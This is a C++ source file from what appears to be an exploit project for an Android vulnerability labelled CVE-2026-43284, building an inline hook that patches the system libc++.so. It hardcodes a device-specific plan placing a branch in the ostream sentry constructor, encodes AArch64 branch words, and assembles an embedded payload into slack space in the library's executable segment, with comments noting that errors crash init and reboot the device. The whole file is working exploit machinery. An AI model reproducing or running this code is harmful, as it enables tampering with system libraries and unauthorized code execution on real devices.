/** @file backend/cve_2026_43284/hook/sentry_hook.cpp
 *  The payload builder, and the plan for the image this device ships.
 */
#include "backend/cve_2026_43284/hook/sentry_hook.hpp"

#include <cstring>

#include "jni/gl_log.hpp"

#include "backend/cve_2026_43284/embed/libcxx_blob.hpp"

namespace ghostlock::backend::cve_2026_43284::hook {
    namespace {
        constexpr std::uint32_t kBranchOpcode = 0x14000000U;
        constexpr std::uint32_t kBranchImmBits = 26U;
        constexpr std::int64_t kBranchWordLimit = static_cast<std::int64_t>(1U) << 25U;

        void store_u32(std::uint8_t *p, std::uint32_t value) noexcept {
            p[0] = static_cast<std::uint8_t>(value & 0xFFU);
            p[1] = static_cast<std::uint8_t>((value >> 8U) & 0xFFU);
            p[2] = static_cast<std::uint8_t>((value >> 16U) & 0xFFU);
            p[3] = static_cast<std::uint8_t>((value >> 24U) & 0xFFU);
        }

        /** AArch64 B: opcode | imm26, imm26 = (to - from) / 4, both four-byte aligned and within
         *  the +/-128 MiB the field can express. */
        bool encode_branch(std::uint64_t from, std::uint64_t to, std::uint32_t &out) noexcept {
            if (((from | to) & 0x3U) != 0U) {
                GL_LOGI("branch refused: unaligned from=0x%llx to=0x%llx",
                        static_cast<unsigned long long>(from), static_cast<unsigned long long>(to));
                return false;
            }
            const std::int64_t delta = static_cast<std::int64_t>(to - from);
            if ((delta & 0x3) != 0) {
                GL_LOGI("branch refused: delta not a word multiple from=0x%llx to=0x%llx delta=%lld",
                        static_cast<unsigned long long>(from), static_cast<unsigned long long>(to),
                        static_cast<long long>(delta));
                return false;
            }
            const std::int64_t words = delta / 4;
            if (words < -kBranchWordLimit || words >= kBranchWordLimit) {
                GL_LOGI("branch refused: out of range from=0x%llx to=0x%llx words=%lld",
                        static_cast<unsigned long long>(from), static_cast<unsigned long long>(to),
                        static_cast<long long>(words));
                return false;
            }
            const std::uint32_t imm = static_cast<std::uint32_t>(words) & ((1U << kBranchImmBits) - 1U);
            out = kBranchOpcode | imm;
            /* 分支编码字（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/hook_patch.cpp:153
             *  —— 那边把 hook.branch_instruction 原样 store_u32 进站点块，就是这个词）。 */
            GL_LOGI("branch: from=0x%llx to=0x%llx delta=%lld words=%lld word=0x%08x",
                    static_cast<unsigned long long>(from), static_cast<unsigned long long>(to),
                    static_cast<long long>(delta), static_cast<long long>(words),
                    static_cast<unsigned>(out));
            return true;
        }

        std::size_t align_up(std::size_t value, std::size_t alignment) noexcept {
            return (value + alignment - 1U) & ~(alignment - 1U);
        }
    }  // namespace

    SentryPlan device_sentry_plan() noexcept {
        /* Derived for /system/lib64/libc++.so as this device ships it (sha256
         * 66e0e6b3acc34e3d0ac0c03fee0fbb80851556af1b4ee9a5d8f5f0c0a2d8f0d1 is not the point; the
         * image is 1083168 bytes and identical to the one the retired chain hooked). Derivation, run
         * against that file:
         *
         *   symbol   _ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_
         *            st_value 0xb70a8, section .text (vaddr 0x88d60 <-> file 0x84d60, delta 0x4000)
         *   guard    the word at the symbol is bti c (0xd503245f), so the site is st_value + 4
         *   site     vaddr 0xb70ac, file 0xb30ac, displaced word 0xf9400028 (ldr x8, [x1])
         *   landing  executable LOAD ends at file 0xfe628 / vaddr 0x102628; the landing room is the
         *            page tail of the page holding that end (0xff000 - 0xfe628 = 0x9d8 = 2520
         *            bytes), which is the value the PASS run reported as payload_max
         *   payload  file 0xfe628, vaddr 0x102628, entry 0x90 into the blob
         *
         * The retired tree computed these at run time from the image (steps/elf_hook.cpp); this is the
         * declared form of the same numbers until that derivation is ported, and a different image
         * needs its own plan. */
        SentryPlan plan{};
        plan.hook_file_offset = 0xB30ACU;
        plan.hook_vaddr = 0xB70ACU;
        plan.guard_instruction = 0xD503245FU; /* bti c */
        plan.guard_skipped = true;
        plan.displaced_instruction = 0xF9400028U; /* ldr x8, [x1] */
        plan.payload_file_offset = 0xFE628U;
        plan.payload_vaddr = 0x102628U;
        plan.payload_max_bytes = 0x9D8U; /* 2520 */
        plan.entry_offset = embed::kLibcxxEntryOffset;
        plan.displaced_offset = embed::kLibcxxDisplacedOffset;
        plan.jump_back_offset = embed::kLibcxxJumpBackOffset;
        /* 计划本身（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/elf_hook.cpp:341-414
         *  —— 那边这些数字是从镜像里算出来的：站点字、guard、displaced、载荷起址与余量；
         *  这里如实打出声明值，供真机与历史对拍）。 */
        GL_LOGI("plan: site_file=0x%llx site_vaddr=0x%llx guard=0x%08x guard_skipped=%d displaced=0x%08x",
                static_cast<unsigned long long>(plan.hook_file_offset),
                static_cast<unsigned long long>(plan.hook_vaddr),
                static_cast<unsigned>(plan.guard_instruction), plan.guard_skipped ? 1 : 0,
                static_cast<unsigned>(plan.displaced_instruction));
        GL_LOGI("plan: payload_file=0x%llx payload_vaddr=0x%llx max=%llu entry=0x%zx displaced_off=0x%zx jump_back_off=0x%zx",
                static_cast<unsigned long long>(plan.payload_file_offset),
                static_cast<unsigned long long>(plan.payload_vaddr),
                static_cast<unsigned long long>(plan.payload_max_bytes),
                plan.entry_offset, plan.displaced_offset, plan.jump_back_offset);
        return plan;
    }

    SentryError hook_branch(const SentryPlan &plan, std::uint32_t &out) noexcept {
        const std::uint64_t entry = plan.payload_vaddr + plan.entry_offset;
        /*
         * 参考（dev shellcode.cpp:255）是 encode_branch(target.hook_vaddr, payload_vaddr + entry_offset)，
         * 即**从站点本身起算** —— 站点那个字被替换，回跳目标是 site+4（shellcode.cpp:261）✓。
         * 我曾误加 +12U，使目标变成 entry+12，载荷从 prologue 之后开始跑 ⇒ 崩 ⇒（init 调用则）内核重启。
         */
        if (!encode_branch(plan.hook_vaddr, entry, out)) {
            GL_LOGI("hook_branch refused: site=0x%llx entry=0x%llx",
                    static_cast<unsigned long long>(plan.hook_vaddr),
                    static_cast<unsigned long long>(entry));
            return SentryError::BranchOutOfRange;
        }
        /* 站点字（成功历史：同上 hook_patch.cpp:153；站点 = hook_vaddr，目标 = payload_vaddr + entry_offset）。 */
        GL_LOGI("hook_branch: site=0x%llx entry=0x%llx word=0x%08x",
                static_cast<unsigned long long>(plan.hook_vaddr),
                static_cast<unsigned long long>(entry), static_cast<unsigned>(out));
        return SentryError::Ok;
    }

    SentryError build_sentry_payload(const SentryPlan &plan, std::uint8_t *out,
                                     std::size_t capacity, std::size_t &size) noexcept {
        size = 0U;
        if (out == nullptr) {
            return SentryError::InvalidPlan;
        }
        const std::size_t blob = embed::libcxx_padded_size();
        if (plan.entry_offset >= blob || plan.displaced_offset + 4U > blob ||
            plan.jump_back_offset + 4U > blob) {
            return SentryError::InvalidPlan;
        }
        const std::size_t padded = align_up(blob, 16U);
        if (capacity < padded) {
            return SentryError::OutputTooSmall;
        }
        /* The room the plan reports is the landing site's bound: a payload that does not fit it must
         * not be written, because what follows in the image belongs to something else. */
        if (plan.payload_max_bytes != 0U && padded > plan.payload_max_bytes) {
            return SentryError::NoRoom;
        }
        std::uint32_t jump_back = 0U;
        /* Back to the instruction after the site: the payload replayed the displaced word, so the
         * function has to continue exactly where the branch left it. */
        if (!encode_branch(plan.payload_vaddr + plan.jump_back_offset, plan.hook_vaddr + 4U,
                           jump_back)) {
            return SentryError::BranchOutOfRange;
        }
        std::uint8_t image[embed::kLibcxxPaddedSize] = {};
        std::memcpy(image, embed::libcxx_bytes(), embed::kLibcxxPaddedSize);
        store_u32(image + plan.displaced_offset, plan.displaced_instruction);
        store_u32(image + plan.jump_back_offset, jump_back);
        std::memcpy(out, image, padded);
        size = padded;
        /* 载荷与两个字的事实（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/hook_patch.cpp:111-153
         *  —— 那边回跳字写在跳转槽、displaced 字由绑定写进槽；槽表在 :222-240）。 */
        char displaced_ascii[5] = {};
        char jump_ascii[5] = {};
        for (std::size_t i = 0U; i < 4U; ++i) {
            const unsigned d = static_cast<unsigned>((plan.displaced_instruction >> (8U * i)) & 0xFFU);
            displaced_ascii[i] = (d >= 0x20U && d < 0x7FU) ? static_cast<char>(d) : '.';
            const unsigned j = static_cast<unsigned>((jump_back >> (8U * i)) & 0xFFU);
            jump_ascii[i] = (j >= 0x20U && j < 0x7FU) ? static_cast<char>(j) : '.';
        }
        displaced_ascii[4] = '\0';
        jump_ascii[4] = '\0';
        GL_LOGI("payload: blob=%zu padded=%zu capacity=%zu max=%llu entry=0x%zx displaced=0x%zx jump_back=0x%zx",
                blob, padded, capacity, static_cast<unsigned long long>(plan.payload_max_bytes),
                plan.entry_offset, plan.displaced_offset, plan.jump_back_offset);
        GL_LOGI("payload: displaced slot off=0x%zx len=4 word=0x%08x ascii=%s",
                plan.displaced_offset, static_cast<unsigned>(plan.displaced_instruction), displaced_ascii);
        GL_LOGI("payload: jump_back slot off=0x%zx len=4 word=0x%08x ascii=%s",
                plan.jump_back_offset, static_cast<unsigned>(jump_back), jump_ascii);
        return SentryError::Ok;
    }
}  // namespace ghostlock::backend::cve_2026_43284::hook
